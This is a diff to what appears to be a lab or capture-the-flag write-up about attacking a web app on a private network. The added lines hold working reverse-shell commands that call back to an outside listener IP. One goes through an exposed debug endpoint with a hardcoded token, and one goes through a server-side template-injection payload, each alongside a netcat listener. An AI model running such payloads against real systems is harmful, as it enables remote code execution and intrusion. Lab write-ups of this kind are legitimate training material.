@@ -68,10 +68,12 @@ DEBUG_ENDPOINT = "/api/debug"
 ENV = "development"
 ```
 
-You can get a shell with the url http://localhost:5042/api/debug\?cmd=$PAYLOAD\&token=h4l_d3bug_t0k3n_2024 
-after starting a netcat listener on your side
+You can get a shell with the debug url after starting a netcat listener on your side
 ```
 nc -lvnp 4444
+curl -v -G http://localhost:5042/api/debug\
+ --data-urlencode "cmd=bash -c \"bash -i >& /dev/tcp/192.168.129.23/4444 0>&1\""\
+ --data-urlencode "token=h4l_d3bug_t0k3n_2024"
 ```
 
 ## Evaluate injection
@@ -96,7 +98,7 @@ we learned that the server is python so we can try to inject python code using t
 nc -lvnp 4444
 curl -X POST http://192.168.56.102:5042/evaluate \
   -H "X-Debug-Render: true" \
-  --data-urlencode "project_name={{ self.init.globals.builtins.import('os').popen('bash -c "bash -i >& /dev/tcp/192.168.56.1/4444 0>&1"').read() }}"
+  --data-urlencode "project_name={{ self.init.globals.builtins.import('os').popen('bash -c "bash -i >& /dev/tcp/192.168.129.23/4444 0>&1"').read() }}"
 ```
 we can get further information from /api/internal/schema
 ```
